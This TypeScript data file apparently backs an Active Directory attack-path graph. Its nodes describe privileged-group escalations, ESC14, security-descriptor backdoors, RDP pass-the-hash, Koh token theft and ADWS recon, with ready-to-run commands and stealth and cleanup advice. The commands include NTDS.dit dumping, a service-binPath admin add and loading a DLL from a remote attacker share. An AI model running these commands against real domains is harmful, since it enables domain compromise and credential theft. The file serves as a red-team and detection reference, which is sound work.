import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { mitre, r } from '../lib';

const HT = 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology';
const builtinsRef = { label: 'The Hacker Recipes, Built-in security groups', url: 'https://www.thehacker.recipes/ad/movement/builtins/security-groups' };
const htGroupsRef = { label: 'HackTricks, Privileged Groups & Token Privileges', url: `${HT}/privileged-groups-and-token-privileges.html` };

/**
 * Convergence layer: per-group privilege-escalation nodes that each link into
 * the specific attack path they unlock (e.g. Cert Publishers -> AD CS), plus
 * techniques surfaced from the HackTricks / SpecterOps coverage audit.
 */
export const adConvergenceNodes: TechniqueNodeDef[] = [
  { id: 'ad-cat-priv-groups', label: 'Privileged Groups & Roles', phase: 'priv-esc', kind: 'category', summary: 'Each privileged group or admin role opens a route to DA.', description: "Each privileged group or admin role carries a distinct escalation: built-in AD groups like Account Operators, Backup Operators, Server Operators, and DnsAdmins, plus application-admin roles such as SCCM Full Administrator. Membership in any of these is often a direct route to Domain Admin or to SYSTEM on a domain controller. Cert Publishers is the exception: membership alone is not a route to DA, it only grants write over the userCertificate attribute and is dangerous only when paired with an AD CS misconfiguration such as write access to NTAuthCertificates." },

  {
    id: 'pg-sccm-admins',
    label: 'SCCM Administrators',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'The SCCM Full / Application Administrator role runs code as SYSTEM estate-wide.',
    description:
      "SCCM's own RBAC roles (Full Administrator, Application Administrator) are not AD groups. Holding one gives control of the deployment platform: push an application or script to any managed client and run it as SYSTEM. That amounts to domain-wide code execution. You reach the role by being granted it, or by taking over the SCCM hierarchy through NTLM relay / client-push.",
    tools: [{ name: 'SharpSCCM', url: 'https://github.com/Mayyhem/SharpSCCM' }],
    mitre: mitre('T1072'),
    references: [{ label: 'SpecterOps, SCCM Hierarchy Takeover', url: 'https://specterops.io/blog/2023/09/25/sccm-hierarchy-takeover/' }],
    requires: ['SCCM Full Administrator or Application Administrator role'],
  },

  // ── Built-in privileged groups → the attack each one unlocks ─────────────
  {
    id: 'pg-cert-publishers',
    label: 'Cert Publishers',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Write userCertificate on principals; a foothold toward AD CS abuse (NTAuth write is a non-default misconfig).',
    description:
      "By default the Cert Publishers group only has Write over the userCertificate attribute of user and computer objects (plus control of the CA configuration containers). That gives a certificate-mapping and persistence primitive, well short of Domain-Admin-equivalent, and it does NOT include write over NTAuthCertificates. Where that non-default misconfiguration is present, membership becomes far more dangerous: publish a rogue CA certificate into the NTAuth store and forge client-authentication certs for any account. NTAuth write is a misconfiguration to check for, not an inherent right of the group.",
    tools: [
      { name: 'BloodHound', url: 'https://github.com/SpecterOps/BloodHound' },
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
    ],
    commands: [
      { label: 'Confirm membership & enumerate the PKI', code: r`Get-ADGroupMember 'Cert Publishers'; certipy find -u user@corp.local -p PASS -dc-ip 10.0.0.1 -stdout`, lang: 'powershell' },
    ],
    mitre: mitre('T1649'),
    references: [htGroupsRef, builtinsRef, { label: 'Decoder, A deep dive in Cert Publishers Group', url: 'https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/' }],
    requires: ['Membership in Cert Publishers'],
    opsec: 'Writes to the NTAuth/CA store are auditable directory changes; the downstream certificate enrollment + PKINIT logon are the higher-signal events.',
  },
  {
    id: 'pg-backup-operators',
    label: 'Backup Operators',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'SeBackupPrivilege reads any file, so copy the DC NTDS.dit + SYSTEM hive for offline hash extraction.',
    description:
      "Backup Operators hold SeBackupPrivilege, which bypasses file DACLs, but the privilege is DISABLED in the token by default: enable it in an elevated (high-integrity) session before robocopy /b or reg save will read locked/protected files. Remote access is a separate precondition from the privilege: Backup Operators get 'Allow log on locally' on DCs, but interactive/WinRM access is not automatic (WinRM needs Remote Management Users membership); the nxc route here uses SMB, no interactive logon. On a Domain Controller, snapshot or back up the locked NTDS.dit and SYSTEM hive, then parse them offline: a DCSync-equivalent dump of every domain secret without replication rights.",
    tools: [
      { name: 'diskshadow / robocopy', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow' },
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec (backup_operator)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Back up NTDS.dit + SYSTEM via a shadow copy (take the HarddiskVolumeShadowCopyN number from the diskshadow output; it is not always 1)', code: r`diskshadow /s script.txt
robocopy /b \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS . NTDS.dit
reg save HKLM\SYSTEM system.hive`, lang: 'cmd' },
      { label: 'Parse the hives offline', code: r`secretsdump.py -ntds NTDS.dit -system system.hive LOCAL`, lang: 'bash' },
      { label: "Dump the DC's SAM/SYSTEM/SECURITY hives + machine-account hash via SeBackupPrivilege (NetExec, no admin needed)", code: r`nxc smb <dc> -u user -p pass -M backup_operator`, lang: 'bash' },
      { label: 'Then DCSync with the recovered machine-account hash to reach domain secrets', code: r`secretsdump.py 'CORP/DC01$'@dc01.corp.local -hashes :<machine-account-nthash>`, lang: 'bash' },
    ],
    mitre: mitre('T1003.003'),
    references: [htGroupsRef, builtinsRef],
    requires: ['Membership in Backup Operators', 'An elevated session so SeBackupPrivilege can be enabled', 'Remote reach to a DC (SMB for the nxc route; WinRM needs Remote Management Users)'],
    opsec: 'Shadow-copy creation and locked-file reads on a DC are loud (VSS / 4688); quieter than touching LSASS but still monitored.',
  },
  {
    id: 'pg-server-operators',
    label: 'Server Operators',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Reconfigure a DC service binPath to run an attacker command as SYSTEM on the Domain Controller.',
    description:
      'Server Operators can manage services on Domain Controllers. Repoint an existing DC service to an attacker command and restart it. The Service Control Manager runs it as LocalSystem on the DC, which is full domain compromise.',
    tools: [{ name: 'sc.exe', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config' }],
    commands: [
      { label: 'Reconfigure a DC service to add an admin (SYSTEM)', code: r`sc \\dc01 config <service> binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators corp\attacker /add"
sc \\dc01 stop <service> & sc \\dc01 start <service>`, lang: 'cmd' },
    ],
    mitre: mitre('T1543.003'),
    references: [htGroupsRef, builtinsRef],
    requires: ['Membership in Server Operators'],
    opsec: "Reconfiguring an existing DC service dodges the loud new-service events (7045/4697 do NOT fire here), which makes it stealthier than installing a new service. What actually fires: 7040 (config/start-type change), Sysmon 13 on HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>\\ImagePath, stop/start noise (7034/7036), and 4670/object-access only if a SACL is set on the service object. Revert the service config.",
  },
  {
    id: 'pg-dnsadmins',
    label: 'DnsAdmins',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Make the DNS service (usually on a DC) load an arbitrary DLL as SYSTEM.',
    description:
      'DnsAdmins can set the ServerLevelPluginDll registry value over RPC; on the next DNS service restart the (DC-hosted) DNS server loads that attacker DLL as LocalSystem, giving code execution as SYSTEM on the Domain Controller.',
    tools: [
      { name: 'dnscmd', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd' },
      { name: 'DNSAdmin-DLL', url: 'https://github.com/kazkansouh/DNSAdmin-DLL' },
    ],
    commands: [
      { label: 'Point the DNS service at an attacker DLL', code: r`dnscmd dc01 /config /serverlevelplugindll \\10.0.0.66\share\evil.dll
sc \\dc01 stop dns & sc \\dc01 start dns`, lang: 'cmd' },
    ],
    mitre: mitre('T1574.001'),
    references: [htGroupsRef, { label: 'labofapenetrationtester, Abusing DNSAdmins', url: 'https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html' }, { label: 'Shay Ber, Feature, not bug: DNSAdmin to DC compromise in one line', url: 'https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83' }],
    requires: ['Membership in DnsAdmins', 'Ability to restart the DNS service (or wait for a restart)'],
    opsec: 'ServerLevelPluginDll changes + a DNS service restart on a DC are high-signal. Clean up the registry value afterwards.',
  },
  {
    id: 'pg-schema-admins',
    label: 'Schema Admins',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Alter the schema default security descriptor so new objects inherit an attacker ACE domain-wide.',
    description:
      "Schema Admins can modify class schema, including the defaultSecurityDescriptor applied to every newly-created object of a class. Adding an attacker ACE (e.g. GenericAll) stamps only onto FUTURE objects of that class at creation time; it never lands on existing objects such as the domain root. So this does not grant DCSync directly: the domain-head DACL is never re-created and never inherits the schema default. The path is indirect and patient: control a resulting privileged principal, then as a separate step edit the domain naming-context head's DACL to grant both DS-Replication-Get-Changes and DS-Replication-Get-Changes-All before you can DCSync.",
    tools: [{ name: 'PowerView / AD PowerShell', url: 'https://github.com/PowerShellMafia/PowerSploit' }],
    commands: [
      { label: 'Append an ACE to a class default SD (illustrative)', code: r`Set-ADObject -Identity 'CN=User,CN=Schema,CN=Configuration,DC=corp,DC=local' -Replace @{defaultSecurityDescriptor='<existing SDDL>(A;;CCDCLCSWRPWPLOCRRCWDWO;;;<attacker-SID>)'}`, lang: 'powershell' },
    ],
    mitre: mitre('T1484'),
    references: [htGroupsRef, builtinsRef, { label: 'SpecterOps, An ACE Up the Sleeve: Designing AD DACL Backdoors', url: 'https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf' }],
    requires: ['Membership in Schema Admins', 'Schema writes must target the Schema Master FSMO role holder'],
    opsec: 'Schema modifications are rare and heavily audited (replicated forest-wide). Effects are delayed (only new objects), so this is a patient persistence/escalation primitive.',
  },
  {
    id: 'pg-account-operators',
    label: 'Account Operators',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Reset passwords and edit most non-protected users & groups, feeding straight into ACL abuse.',
    description:
      'Account Operators can create/modify most users and groups that are not in a protected (AdminSDHolder) group: reset passwords, add members, set SPNs. That control over a wide swathe of principals enables the DACL/ACL abuse techniques directly (targeted Kerberoast, force-change-password, add-to-group).',
    tools: [{ name: 'net.exe / AD PowerShell', url: 'https://learn.microsoft.com/en-us/powershell/module/activedirectory/' }],
    commands: [
      { label: 'Reset a non-protected user / add to a group', code: r`Set-ADAccountPassword -Identity victim -Reset -NewPassword (ConvertTo-SecureString 'Newp@ss1' -AsPlainText -Force)
net group "Some Group" attacker /add /domain`, lang: 'powershell' },
    ],
    mitre: mitre('T1098'),
    references: [htGroupsRef, builtinsRef],
    requires: ['Membership in Account Operators', 'Targets not protected by AdminSDHolder'],
    opsec: 'Password resets (4724) and group changes (4728/4732) are auditable; protected groups (Domain/Enterprise Admins, etc.) are out of reach by design.',
  },

  // ── Coverage gaps from the HackTricks / SpecterOps audit ─────────────────
  {
    id: 'adcs-esc14',
    label: 'ADCS ESC14 (Weak Explicit Cert Mapping)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Abuse altSecurityIdentities explicit mappings to impersonate a privileged account.',
    description:
      "ESC14 abuses explicit certificate-to-account mappings in the altSecurityIdentities attribute, which override the KDC's implicit UPN/SID mapping. With write rights over a target's altSecurityIdentities, add a STRONG explicit mapping (X509IssuerSerialNumber) that references a certificate you can enroll, then PKINIT as the target. A strong mapping is honored even under Full StrongCertificateBindingEnforcement (the 2022 hardening), so it survives that hardening; the WEAK mapping types (X509SubjectOnly, X509IssuerSubject, X509RFC822) are the ones enforcement blocks, so they only work where enforcement is below Full. A variant abuses a pre-existing weak mapping by setting a victim's mail/cn/dNSHostName to match. altSecurityIdentities is an ordinary directory attribute, written over LDAP/PowerShell, not by Certipy.",
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'PowerView / Set-ADUser (RSAT)', url: 'https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-aduser' },
    ],
    commands: [
      { label: 'Enroll a client-auth cert as a controlled account', code: r`certipy-ad req -u user@corp.local -p PASS -dc-ip 10.0.0.1 -ca CORP-CA -template User`, lang: 'bash' },
      { label: 'Write a STRONG IssuerSerialNumber mapping on the target (issuer DN reversed: root DC first, CN last; serial byte-reversed)', code: r`Set-ADUser TARGET -Replace @{'altSecurityIdentities'='X509:<I>DC=local,DC=corp,CN=CORP-CA<SR><reversed-serial>'}`, lang: 'powershell' },
      { label: 'Authenticate as the target with the cert (PKINIT) → TGT + NT hash', code: r`certipy-ad auth -pfx user.pfx -username TARGET -domain corp.local -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    mitre: mitre('T1649'),
    references: [
      { label: 'SpecterOps, ADCS ESC14 Abuse Technique', url: 'https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/' },
      { label: 'Microsoft, KB5014754 (strong vs weak certificate mappings)', url: 'https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16' },
      { label: 'Certipy wiki, Privilege Escalation (ESC14)', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
    ],
    requires: ["Write over the target's altSecurityIdentities (or a pre-existing weak mapping + write over a victim's mail/cn/dNSHostName)", 'Enrollment rights on a client-auth template'],
    opsec: 'altSecurityIdentities / victim-attribute writes are auditable (5136) and should be reverted; a STRONG-mapping write is honored even under Full StrongCertificateBindingEnforcement.',
  },
  {
    id: 'security-descriptor-backdoor',
    label: 'Security-Descriptor Backdoors (DAMP / Nishang)',
    phase: 'persistence',
    needs: 'local-admin',
    summary: 'Edit host security descriptors so a chosen low-priv user keeps remote WMI/WinRM or hash-pull access, with no group membership.',
    description:
      "Instead of adding accounts or touching groups, weaken the discretionary ACLs on a host's remotely-accessible services so an arbitrary trustee retains privileged remote access. DAMP's (SpecterOps/HarmJ0y) Add-RemoteRegBackdoor ACL-backdoors the remote-registry/SAM keys so the chosen user can pull secrets on demand, each via its own function: Get-RemoteMachineAccountHash (machine-account hash), Get-RemoteLocalAccountHash (local SAM), and Get-RemoteCachedCredential (cached domain creds). Nishang's (Nikhil Mittal) Set-RemoteWMI grants remote WMI rights and Set-RemotePSRemoting grants remote PowerShell. On a DC/server this is stealthy, reset-surviving persistence that evades group-membership hunting.",
    tools: [
      { name: 'DAMP (HarmJ0y)', url: 'https://github.com/HarmJ0y/DAMP' },
      { name: 'Nishang (Set-RemoteWMI / Set-RemotePSRemoting)', url: 'https://github.com/samratashok/nishang' },
    ],
    commands: [
      { label: 'Backdoor remote WMI for a chosen user', code: r`Set-RemoteWMI -UserName student1 -ComputerName dc01 -namespace 'root\cimv2' -Verbose`, lang: 'powershell' },
      { label: 'ACL-backdoor remote registry, then pull hashes on demand', code: r`Add-RemoteRegBackdoor -ComputerName dc01 -Trustee student1 -Verbose
Get-RemoteMachineAccountHash -ComputerName dc01 -Verbose`, lang: 'powershell' },
    ],
    mitre: mitre('T1222'),
    references: [
      { label: 'HackTricks, Security Descriptors', url: `${HT}/security-descriptors.html` },
      { label: 'SpecterOps, An ACE in the Hole (Host SD modification)', url: 'https://specterops.io/blog/2018/04/10/remote-hash-extraction-on-demand-via-host-security-descriptor-modification/' },
      { label: 'GitHub, HarmJ0y/DAMP', url: 'https://github.com/HarmJ0y/DAMP' },
    ],
    requires: ['Local admin / SYSTEM on the target host (a DC for domain-wide value)'],
    opsec: 'Quiet by design: no new accounts or group changes. The one-time SD modification is the detectable moment; afterward backdoored remote-registry hash pulls look like normal access. Remediation requires auditing/resetting the security descriptors, not password rotation.',
  },
  {
    id: 'rdp-restricted-admin-pth',
    label: 'RDP Restricted Admin Pass-the-Hash',
    phase: 'lateral-movement',
    needs: 'creds',
    summary: 'Enable Restricted Admin mode and RDP into a host with only an NT hash, no plaintext.',
    description:
      "Standard RDP needs a plaintext password or Kerberos ticket. Restricted Admin Mode makes the RDP server use a network logon, which enables pass-the-hash over RDP. Set DisableRestrictedAdmin=0 under HKLM\\System\\CurrentControlSet\\Control\\Lsa on the target (remotely if you already have admin), then PtH into the native client with mimikatz sekurlsa::pth /run:'mstsc.exe /restrictedadmin', or use xfreerdp /restricted-admin. The session also leaves no reusable creds on the remote host.",
    tools: [
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'RestrictedAdmin (GhostPack)', url: 'https://github.com/GhostPack/RestrictedAdmin' },
      { name: 'xfreerdp', url: 'https://github.com/FreeRDP/FreeRDP' },
    ],
    commands: [
      { label: 'Enable Restricted Admin on the target (remote reg needs the RemoteRegistry service running, which is disabled by default on modern workstations; otherwise set it via a remote-exec channel or the RestrictedAdmin tool)', code: r`reg add "\\TARGET\HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f`, lang: 'cmd' },
      { label: 'PtH into RDP (mimikatz)', code: r`sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NTLM> /run:"mstsc.exe /restrictedadmin"`, lang: 'text' },
      { label: 'Or from Linux', code: r`xfreerdp /v:target.corp.local /u:Administrator /pth:<NTLM> /restricted-admin`, lang: 'bash' },
    ],
    mitre: mitre('T1021.001'),
    references: [
      { label: 'HackTricks, RDP Sessions Abuse', url: `${HT}/rdp-sessions-abuse.html` },
      { label: 'GitHub, GhostPack/RestrictedAdmin', url: 'https://github.com/GhostPack/RestrictedAdmin' },
      { label: 'Portcullis Labs, New Restricted Admin feature of RDP 8.1 allows pass-the-hash', url: 'https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/' },
    ],
    requires: ['A target NT hash (or AES key) for an account with RDP/admin rights', 'DisableRestrictedAdmin=0 on the target'],
    opsec: 'Enabling Restricted Admin flips a well-watched registry value (a primary detection); the RDP network logon (4624 type 3) from a tool host is unusual. Defenders enforce DisableRestrictedAdmin=1 by GPO.',
  },
  {
    id: 'koh-token-theft',
    label: 'Koh Token / Credential Theft',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Capture and indefinitely reuse the non-network logon-session tokens of users who log on interactively to a host you control.',
    description:
      "Koh (SpecterOps/GhostPack) abuses token / logon-session leakage to harvest the tokens of non-network logons on a machine where you have SYSTEM: local, RDP/interactive, service and batch logons, and NewCredentials (runas /netonly). It does NOT capture network (type 3) logons, so inbound SMB/WinRM/PsExec auth to a DC or jump box is never captured. A capture server holds the leaked tokens open (even after logoff) and a client impersonates them on demand. Unlike LSASS dumping, Koh never reads LSASS and yields no password/hash. It reuses live token material, so it works as both a credential-access primitive and quiet persistence on a high-traffic host (jump box, DC, RDS).",
    tools: [{ name: 'Koh (GhostPack)', url: 'https://github.com/GhostPack/Koh' }],
    commands: [
      { label: 'Start the capture server (as SYSTEM) and list sessions', code: r`Koh.exe capture
Koh.exe list`, lang: 'cmd' },
      { label: 'Impersonate a captured token by LUID (KohClient BOF over the named pipe, not a Koh.exe subcommand)', code: r`koh impersonate <LUID>`, lang: 'cmd' },
    ],
    mitre: mitre('T1134.001'),
    references: [
      { label: 'SpecterOps, Koh: The Token Stealer', url: 'https://specterops.io/blog/2022/07/07/koh-the-token-stealer/' },
      { label: 'GitHub, GhostPack/Koh', url: 'https://github.com/GhostPack/Koh' },
    ],
    requires: ['Local admin / SYSTEM on a host that other (ideally privileged) users authenticate to'],
    opsec: 'Stealthier than LSASS access: no LSASS handle, no hash on disk. The Koh named pipe is an IOC; KB2871997 / TokenLeakDetectDelaySecs and Protected Users membership blunt it. Yields network access as the user, not their cleartext secret.',
  },
  {
    id: 'adws-soapy-enum',
    label: 'ADWS / SoaPy Stealth Enumeration',
    phase: 'enumeration',
    needs: 'domain-user',
    summary: 'Collect AD data over ADWS (TCP 9389) instead of LDAP for far stealthier recon.',
    description:
      'AD Web Services (ADWS) is enabled on every DC since Server 2008 R2 and exposes LDAP-style data over .NET SOAP framing on TCP 9389. Because ADWS proxies queries to local LDAP, collection appears as the DC connecting to itself, and the uncommon binary-SOAP traffic on 9389 is far less inspected than LDAP 389/636. SoaPy re-implements the ADWS stack in pure Python (runs from Linux through a SOCKS proxy) with BOFHound output for direct BloodHound ingestion, so you get the same attack-path graph while dodging LDAP-focused monitoring.',
    tools: [
      { name: 'SoaPy', url: 'https://github.com/logangoins/SOAPy' },
      { name: 'BOFHound', url: 'https://github.com/coffeegist/bofhound' },
    ],
    commands: [
      { label: 'Collect over ADWS via SOCKS (tee the BOFHound-formatted output to a log dir)', code: r`soapy corp.local/user:'PASS'@dc01.corp.local -dn 'DC=corp,DC=local' -q '(objectClass=user)' | tee data/users.log`, lang: 'bash' },
      { label: 'Transform into BloodHound JSON', code: r`bofhound -i data/ -o bloodhound_json/`, lang: 'bash' },
    ],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'SpecterOps, Make Sure to Use SOAP(y)', url: 'https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/' },
      { label: 'GitHub, logangoins/SOAPy', url: 'https://github.com/logangoins/SOAPy' },
    ],
    requires: ['Valid domain credentials', 'TCP 9389 reachable to a DC (often via a SOCKS proxy/foothold)'],
    opsec: 'Quieter than LDAP recon: it masks the originating HOST (in the ADDS/LDAP log the computer field shows the DC and the client address shows loopback), but the querying USER is still logged, so ADWS hides where the query came from, not who ran it. 9389 is rarely inspected, and ADWS is also used by RSAT/ADAC so it blends with admin traffic, but it is not invisible: a SACL canary on a decoy object fires Event ID 4662 recording the real querying account, which defeats the log obfuscation entirely.',
  },
];

export const adConvergenceEdges: AttackEdge[] = [
  // Privileged-groups sub-tree, grouped by type (operators / service-role / deployment).
  { source: 'ad-cat-priv-groups', target: 'pgcat-ops' },
  { source: 'ad-cat-priv-groups', target: 'pgcat-service' },
  { source: 'ad-cat-priv-groups', target: 'pgcat-deploy' },
  { source: 'pgcat-service', target: 'pg-cert-publishers' },
  { source: 'pgcat-ops', target: 'pg-backup-operators' },
  { source: 'pgcat-ops', target: 'pg-server-operators' },
  { source: 'pgcat-service', target: 'pg-dnsadmins', description: 'Indicators this path applies: whoami /groups or net user shows membership in DnsAdmins (a role-created domain-local group; its RID varies, so match by group name, not by a fixed SID); Target is a Domain Controller running the Microsoft DNS Server service (dns.exe); dnscmd.exe available or RSAT DNS tools / WMI remote DNS management reachable.' },
  { source: 'pgcat-service', target: 'pg-schema-admins' },
  { source: 'pgcat-ops', target: 'pg-account-operators' },
  { source: 'pgcat-deploy', target: 'pg-sccm-admins' },
  // Each group converges into the attack path it unlocks
  { source: 'pg-cert-publishers', target: 'ad-cat-adcs', label: 'Cert Publishers (situational)', description: 'Cert Publishers members can publish certificates to the enterprise store and write CA-related objects. This does NOT grant the ESC1-16 template misconfigurations; direct domain escalation from Cert Publishers membership alone is situational (rogue-cert / NTAuth angle), not a template ESC.' },
  { source: 'pg-backup-operators', target: 'ntds-dump', label: 'SeBackup → read NTDS' },
  { source: 'pg-server-operators', target: 'domain-admin', label: 'reconfig DC service → SYSTEM' },
  { source: 'pg-dnsadmins', target: 'domain-admin', label: 'DLL on DC → SYSTEM' },
  { source: 'pg-schema-admins', target: 'ad-cat-dacl', label: 'ACE on future objects' },
  { source: 'pg-account-operators', target: 'ad-cat-dacl', label: 'reset users / add to groups' },
  { source: 'pg-sccm-admins', target: 'sccm-deploy-app', label: 'deploy as SYSTEM' },

  // Coverage-audit nodes
  // ESC14-A is an altSecurityIdentities ACL abuse (GenericWrite over the target), not a
  // template flaw; the template edge only supplies the enrollment/cert-mapping precondition.
  { source: 'ad-cat-adcs-template', target: 'adcs-esc14', label: 'enrollment rights (cert-mapping)' },
  { source: 'acl-genericwrite', target: 'adcs-esc14', label: 'write altSecurityIdentities (ESC14-A)' },
  { source: 'adcs-esc14', target: 'pass-the-certificate', label: 'PKINIT as target' },
  { source: 'persist-backdoor', target: 'security-descriptor-backdoor' },
  { source: 'security-descriptor-backdoor', target: 'dcsync', label: 'on-demand hash retrieval' },
  { source: 'ad-cat-cred-reuse', target: 'rdp-restricted-admin-pth' },
  { source: 'rdp-restricted-admin-pth', target: 'dump-lsass', label: 'admin on target' },
  { source: 'ad-cat-host-dump', target: 'koh-token-theft' },
  { source: 'koh-token-theft', target: 'lateral-movement-cme', label: 'act as user over the network' },
  { source: 'ad-cat-enum', target: 'adws-soapy-enum' },
  { source: 'adws-soapy-enum', target: 'find-privesc-path', label: 'found a path' },
];
